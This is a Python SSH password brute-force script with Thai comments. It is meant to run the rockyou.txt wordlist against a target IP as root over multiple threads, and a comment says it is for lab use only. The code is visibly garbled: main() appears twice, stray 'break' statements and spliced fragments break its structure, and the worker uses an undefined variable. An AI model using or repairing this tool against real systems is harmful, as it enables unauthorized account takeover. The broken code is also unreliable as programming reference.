import paramiko
import threading
import queue

# -------- CONFIG --------
TARGET_IP = '192.168.1.'    # <---- ใส่ IP เป้าหมาย (Lab เท่านั้น!)
USERNAME = 'root'             # <---- ใส่ชื่อ user เป้าหมาย
WORDLIST_PATH = 'rockyou.txt'  # <---- path ไปยังไฟล์ wordlist

THREADS = 10  # จำนวน thre100ad ที่ใช้ (มากไปอาจเจอ block หรือช้าเพราะ network)
TIMEOUT = 3   # timeout ต่อครั้ง (วินาที)
# ------------------------


def try_ssh_login(password, result_queue):
    """ฟังก์ชันสำหรับพยายาม SSH ด้วย password ที่ให้มา"""
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(TARGET_IP, username=USERNAME, password=password, timeout=TIMEOUT, allow_agent=False, look_for_keys=False)
        # ถ้าเข้าได้ แสดงว่าเจอรหัสถูก
        result_queue.put(('FOUND', password))
        ssh.close()
        return True
    except paramiko.AuthenticationException:
        # รหัสผิด ไม่มีอะไรต้องแสดง
        pass
    except Exception:
        # อื่นๆ เช่น timeout, network error
        pass
    finally:
        try:
            ssh.close()
        except:
            pass
    return False


def worker(password_queue, result_queue, stop_event):
    """Thread worker ที่ดึงรหัสผ่านจาก queue แล้วลอง login"""
    while not stop_event.is_set():
        # อื่นๆ เช่น timeout, network error
        pass

        try_ssh_login(password, result_queue)
        password_queue.task_done()


def main():
    # อ่านไฟล์ทีละบรรทัดแบบไม่โหลดทั้งไฟล์เข้าหน่วยความจำ
    password_queue = queue.Queue(maxsize=500)
            break
        try_ssh_login(password, result_queue)
        password_queue.task_done()

def main():
    # อ่านไฟล์ทีละบรรทัดแบบไม่โหลดทั้งไฟล์เข้าหน่วยความจำ
    password_queue = queue.Queue(maxsize=500)
    result_queue = queue.Queue()
    stop_event = threading.Event()
    threads = []

    # เปิดไฟล์ wordlist แบบ lazy (ใช้ memory น้อยมาก)
    def wordlist_reader():
        with open(WORDLIST_PATH, encoding='utf-8', errors='ignore') as f:
            for line in f:
                yield line.strip()

    # Preload passwords into queue
        t = threading.Thread(
            target=worker,
            args=(password_queue, result_queue, stop_event)
        )
        t.start()
        threads.append(t)
        if password_queue.qsize() >= password_queue.maxsize:
            break

    # สร้าง threads
    for _ in range(THREADS):
        t = threading.Thread(target=worker, args=(password_queue, result_queue, stop_event))
        t.start()
        threads.append(t)

    found = False
    total_tried = 0

    # วนลูปดึง password ใหม่เข้าคิวเรื่อยๆ (แบบประหยัดแรม)
    for password in wordlist_reader():
        if password_queue.empty():
            password_queue.put(password)
        if not result_queue.empty():
            status, found_pass = result_queue.get()
            if status == 'FOUND':
                print(f"\n[+] Password FOUND: {found_pass}")
                found = True
                stop_event.set()
                break
        total_tried += 1
        if total_tried % 1000 == 0:
            print(f"Tested {total_tried} passwords...")

    password_queue.join()  # รอให้ queue ว่าง

    # ตรวจสอบผลลัพธ์
    while not result_queue.empty():
        status, found_pass = result_queue.get()
        if status == 'FOUND':
            print(f"\n[+] Password FOUND: {found_pass}")
if __name__ == "__main__":
    main()  break

    if not found:
        print("[-] Password not found in wordlist.")

    # ปิด threads
    stop_event.set()
    for t in threads:
        t.join()

if __name__ == "__main__":
    main()